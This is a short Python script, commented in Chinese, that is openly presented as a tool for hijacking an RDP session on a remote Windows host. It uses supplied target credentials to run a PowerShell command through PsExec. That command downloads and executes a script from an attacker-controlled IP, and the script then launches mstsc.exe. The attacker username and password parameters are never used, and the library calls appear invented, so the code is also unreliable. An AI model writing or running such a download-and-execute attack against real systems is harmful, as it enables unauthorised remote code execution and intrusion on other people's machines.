import psexec

def hijack_rdp_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password):
    try:
        # 創建PSExec對象
        psexec_client = psexec.Psexec(target_host, username=target_username, password=target_password)
        # 透過psexec執行攻擊者腳本以接管RDP session
        psexec_client.run("powershell -command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://{}/attacker_script.ps1')\"".format(attacker_ip))
        psexec_client.run("powershell -command \"Start-Process -FilePath 'mstsc.exe'\"")
    except Exception as e:
        print(str(e))

# 使用範例
target_host = "target_host_ip"
target_username = "target_username"
target_password = "target_password"
attacker_ip = "attacker_ip"
attacker_username = "attacker_username"
attacker_password = "attacker_password"

hijack_rdp_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password)